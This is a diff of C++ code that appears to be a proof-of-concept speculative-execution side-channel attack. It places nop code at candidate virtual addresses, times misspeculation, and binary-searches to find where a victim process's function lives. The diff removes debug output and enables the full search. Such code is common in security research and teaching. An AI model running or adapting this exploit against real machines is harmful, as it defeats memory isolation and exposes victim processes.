@@ -3,7 +3,7 @@
 #include <fstream>
 #define magicNumber 123*256
 #define maxCopyLength 128
-#define iterations 10000
+#define iterations 1000
 
 using namespace std;
 
@@ -53,7 +53,6 @@ int checkForMisspeculation() {
 }
 
 void loadMemory() { // this should be at the same VA as victim's callLoop()
-	// at least 6 nops!
 	asm(
 		".rept 115;"
 		"nop;"
@@ -64,13 +63,8 @@ void loadMemory() { // this should be at the same VA as victim's callLoop()
 	);
 }
 
-// void tmp() { // this should be at the same VA as victim's callLoop()
-// 	volatile int temp = array[magicNumber];
-// }
-
 int doSearch(ADDR_PTR low, ADDR_PTR high) {
 	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
-	printf("checking %p to %p. diff if is %lu\n", (void *)low, (void *)high, difference);
 	fflush(stdout);
 
 	int copyLength = maxCopyLength;
@@ -78,17 +72,11 @@ int doSearch(ADDR_PTR low, ADDR_PTR high) {
 		copyLength /= 2;
 	}
 
-	printf("copy length is %i\n", copyLength);
-
 	for (ADDR_PTR i = low; i < high; i += copyLength) {
-		printf("i: %p\n", (void *)i);
-		printf("btw %p to %p\n", (void *)low, (void *)high);
 		memcpy((void*)i, (void *)((ADDR_PTR)loadMemoryPtr+maxCopyLength-copyLength), copyLength);
-		// memcpy((void*)i, loadMemoryPtr, maxCopyLength);
 	}
 
 	int result = checkForMisspeculation();
-	printf("time is %i\n", result);
 	memset((void *)low, 0, difference);
 
 	return result;
@@ -96,24 +84,19 @@ int doSearch(ADDR_PTR low, ADDR_PTR high) {
 
 ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
 	ADDR_PTR midpoint = (low + high) / 2;
-	// printf("midpoint is %p\n", (void*)midpoint);
 	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
 
-	if (difference <= 16) {
+	if (difference <= 64) {
+		printf("Victim function is between virtual addresses %p and %p.\n", (void *)low, (void *)high);
 		return doSearch(low, high);
 	}
 
-	// printf("low is %p, diff is %lu\n", (void*)low, difference);
-
 	int timeLow, timeHigh, timeDiff = 0;
-	printf("starting diff %lu\n", high - low);
 	while(timeDiff < 50) {
 		timeLow = doSearch(low, midpoint);
 		timeHigh = doSearch(midpoint, high);
 		timeDiff = abs(timeLow - timeHigh);
-		// printf("timediff is %i\n", timeDiff);
 	}
-	// return low;
 
 
 	if (timeLow < timeHigh) {
@@ -126,17 +109,6 @@ ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
 void lastFunction();
 
 int main(int argc, char *argv[]){
-	if (argc > 1) {
-		printf("doing nothing\n");
-		while(1) {}
-	}
-
-	// startAddr = 0x0000555555565004;
-
-	// addr = (ADDR_PTR)&array[magicNumber];
-
-	// size_t tmp = 1<<20;
-
 	void *requestedAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<12));
 
 	printf("requesting memory at %p\n", requestedAddr);
@@ -152,19 +124,7 @@ int main(int argc, char *argv[]){
 
 	loadMemoryPtr = (void *)((ADDR_PTR)&loadMemory+4);
 
-	// memset((void*)0x555555556000, 'a', 1);
-	// return 0;
-
-	// search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));
-	doSearch(0x0000555555566000, 0x0000555555566040);
-
-	// memcpy((void *)0x0000555555566000, loadMemoryPtr, maxCopyLength);
-
-	// checkForMisspeculation();
-	// // unmap(startAddr);
-
-	// // void *ptr = copyFunction((ADDR_PTR)&lastFunction, (void *)((ADDR_PTR)&loadMemory+250));
-	// checkForMisspeculation();
+	search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));
 
 	return 0;
 }
